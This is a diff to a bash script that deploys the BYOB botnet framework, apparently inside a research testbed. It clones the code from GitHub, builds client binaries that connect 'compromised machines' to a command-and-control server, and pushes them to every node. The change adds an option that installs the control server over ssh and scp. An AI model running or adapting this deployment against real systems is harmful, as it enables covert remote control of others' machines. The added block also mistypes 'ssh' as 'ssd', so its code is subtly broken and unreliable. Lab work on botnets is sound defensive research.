@@ -7,6 +7,9 @@ port=""
 modules=""
 location="/usr/local/bin"
 help=false
+cANDc=""
+
+byob="$HOME/byob/byob"
 
 
 show_help() {
@@ -19,6 +22,7 @@ show_help() {
     echo -e "-h/--help shows this menu"
     echo -e "-l sets the location to install the client binary"
     echo -e "\tdefaults to /usr/local/bin/byob-client"
+    echo -e "-cc sets the command and control server to install byob on"
     echo -e ""
     echo -e "<xdc> is the xdc you'd like to install byob on"
     echo -e "<C&C ip> is the ip the compromised machines should connect to to reach your command and control server"
@@ -37,6 +41,11 @@ while [[ $# -gt 0 ]]; do
         -l)
             shift
             location="$1"
+            shift
+            ;;
+        -cc) 
+            shift
+            cANDc="$1"
             shift
             ;;
         *)
@@ -76,14 +85,14 @@ remote_exec() {
 
 
 install() {
-    if [ ! -f ~/byob/byob/requirements.txt ]; then
+    if [ ! -f $byob/requirements.txt ]; then
             cd ~
             sudo apt -y update
             sudo apt -y install git gcc python3-dev build-essential socat
             sudo apt -y update --fix-missing
             git clone https://github.com/STEELISI/byob.git byob
     fi
-    cd ~/byob/byob
+    cd $byob
     git pull
     pip install -r ./requirements.txt
 }
@@ -96,7 +105,7 @@ create_client() {
     shift
     modules="$@"
 
-    cd ~/byob/byob
+    cd $byob
 
     tmp=$(python3 ./client.py $server_ip $port $modules | tail -2)
     filename=$(echo $tmp | sed 's#^[^/]*##' | sed 's#)$##')
@@ -120,12 +129,12 @@ client_file=$(create_client $server_ip $port $modules)
 popd
 root=$(echo $client_file | sed 's|^/||;s|/.*||')
 if [ ! -f $root ]; then
-    client_file="$HOME/byob/byob$client_file"
+    client_file="$byob/$client_file"
 fi
 
 nodes=$(./util/list-nodes.sh)
 
-cd ~/byob/byob
+cd $byob
 
 echo ""
 echo "copying client binary"
@@ -146,4 +155,16 @@ for node in $nodes; do
 done
 
 wait
+
+if [ ! "$cANDc" = "" ]; then
+    echo ""
+    echo "Installing command and control server"
+    echo ""
+
+    ssh $cANDc "sudo apt -y update"
+    ssd $cANDc "sudo apt -y install git gcc python3-dev build-essential socat"
+    ssh $cANDc "sudo apt -y update --fix-missing"
+
+    scp -r $byob "$cANDc":~
+fi
 
